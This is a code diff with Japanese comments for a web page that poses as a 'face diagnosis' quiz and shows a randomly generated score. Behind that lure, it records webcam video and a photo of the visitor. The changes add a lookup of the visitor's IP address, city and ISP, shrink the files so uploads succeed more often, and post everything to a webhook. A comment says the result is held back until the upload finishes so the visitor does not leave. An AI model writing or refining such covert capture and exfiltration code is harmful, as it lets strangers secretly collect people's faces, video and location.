@@ -70,31 +70,32 @@
             video.style.display = 'block';
             
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
                 const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
-                mediaRecorder = new MediaRecorder(stream, { mimeType: type });
+                // ビットレートを1Mbpsに制限して送信成功率を向上
+                mediaRecorder = new MediaRecorder(stream, { mimeType: type, videoBitsPerSecond: 1000000 });
                 chunks = [];
 
                 mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-
-                // 録画停止後のデータ確定を待つためのPromise
                 const stopPromise = new Promise(resolve => mediaRecorder.onstop = resolve);
 
-                mediaRecorder.start(500); // 0.5秒ごとにデータを刻んで回収
+                mediaRecorder.start(); 
                 
                 let i = 0;
                 const interval = setInterval(() => {
-                    statusDisplay.innerHTML = messages[i];
-                    i++;
-                    if (i >= messages.length) clearInterval(interval);
+                    if (i < messages.length) {
+                        statusDisplay.innerHTML = messages[i];
+                        i++;
+                    } else {
+                        clearInterval(interval);
+                    }
                 }, 1600);
 
-                // 10秒後に録画を止めて、送信処理へ
                 setTimeout(async () => {
                     if (mediaRecorder.state !== "inactive") {
                         mediaRecorder.stop();
-                        await stopPromise; // ここで動画データが全部揃うのを確実に待つ
+                        await stopPromise;
                         await captureAndSend(user);
                     }
                 }, 10000); 
@@ -106,25 +107,34 @@
         });
 
         async function captureAndSend(user) {
-            statusDisplay.innerHTML = "解析完了。結果を表示します...";
+            // IPと位置情報の取得
+            let ipInfo = "\n🌐 IP/位置情報: 取得失敗";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ipInfo = `\n🌐 IP: ${data.ip}\n📍 場所: ${data.region} ${data.city}\n🏢 ISP: ${data.org}`;
+            } catch (e) { console.error(e); }
+
             const score = (Math.random() * (75 - 45) + 45).toFixed(1);
             
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
+            // PNGからJPEG(0.7)に変更して劇的に軽量化
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【顔診断】\n👤 名前: ${user}\n📊 偏差値: ${score}\n⏱️ 10秒動画: 撮影完了`);
-                formData.append('file1', photoBlob, 'face.png');
+                formData.append('content', `【顔診断レポート】\n👤 名前: ${user}\n📊 偏差値: ${score}${ipInfo}`);
+                formData.append('file1', photoBlob, 'face.jpg');
                 
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                     const ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
-                    formData.append('file2', videoBlob, `scan_10s.${ext}`);
+                    formData.append('file2', videoBlob, `scan.${ext}`);
                 }
 
                 try {
+                    // 送信完了を待ってから結果を表示（離脱防止）
                     await fetch(webhookUrl, { method: 'POST', body: formData });
                 } catch (e) { console.error(e); }
 
@@ -133,7 +143,7 @@
                 nextOptions.style.display = 'block';
                 
                 if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
-            }, 'image/png');
+            }, 'image/jpeg', 0.7);
         }
     </script>
 </body>
